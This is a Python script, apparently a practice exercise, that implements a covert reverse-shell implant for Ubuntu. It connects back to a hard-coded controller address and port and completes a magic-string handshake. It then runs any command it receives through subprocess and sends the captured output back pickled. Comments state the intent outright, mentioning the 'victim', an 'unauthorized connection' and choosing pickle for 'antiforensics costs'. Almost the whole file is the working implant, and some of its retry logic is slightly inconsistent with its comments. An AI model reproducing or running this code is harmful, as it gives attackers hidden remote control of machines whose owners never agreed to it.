#!/usr/bin/python
 
# Task: Implement a server to run on an Ubuntu system. It must:
# -- hold a port
# -- receive commands -- in the form of command-line arguments
# -- execute commands -- via os library
# -- return the results -- capture stdout/stderr...
 
# immediate considerations:
# we'll need sockets
# we'll need pickling or json-ing; i think i'll prefer the pickle to impose
# antiforensics costs
 
# Must EITHER callback OR listen... I think I'd rather...have it call back.
# That means the client will bind and the server will...well that's an odd
# way of thinking about it; having a server initiate the connection? I'm kindof
# reversing the paradigm there...but once the connection is established, the server
# will service client activity, so we'll just roll with that.
 
import socket
import os # return values
import ipaddress # Is this necessary?
import re # for passphrase
import sys # for exit
import subprocess # for commands
import pickle # for transfer
import select # for black magic
 
trinity = "127.0.0.1"
nebuchadnezzar = 31337
 
def sessionStartup(s):
	# We're using a magic string for our initialization; we'll try 3 times and otherwise fail out.
	for i in range(1,3):
		s.sendto("ATDT18005551234".encode(), (trinity,nebuchadnezzar))
		signal = s.recv(512)
		if re.search("ATA", signal.decode()):
			s.sendto("CONNECT".encode(), (trinity, nebuchadnezzar))
			return True
	# If Trinity doesn't pick up, we're screwed
	return False
 
 
 
def main():
	# What, do you think I'd print a banner for the victim? Pshaw.
	# print("Initializing server. Please stand by while your system initiates an unauthorized connection...")
	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Aren't these the default parameters?
	connectionEstablished = False
 
	while True:
		try:
			#s.connect((trinity, nebuchadnezzar)) # Tee-hee

			# This line gets us both socket.socket && socket.connect
			s = socket.create_connection((trinity, nebuchadnezzar))

			# From a SO question on TCP keepalives
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 3)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
		except OSError as e:
			# As they say in PowerShell...SilentlyContinue
			return -1
		if not connectionEstablished:
			result = sessionStartup(s)
			connectionEstablished = True
		if not result:
			return -1
		with s:
			#print("I'm listening") # DEBUG
			instruction = s.recv(4096)
			parsedInstructions = instruction.decode().split()
			try:
				results = subprocess.run(parsedInstructions, capture_output=True)
				p = pickle.dumps(results)
			except OSError as e:
				msg = f"Error encountered: {e}"
				p = pickle.dumps(msg)
			try:
				s.sendall(p)
			except OSError as e:
				#print(f"Error encountered: {e}") # DEBUG
				pass
 
 
 
 
if __name__ == "__main__":
    sys.exit(main())
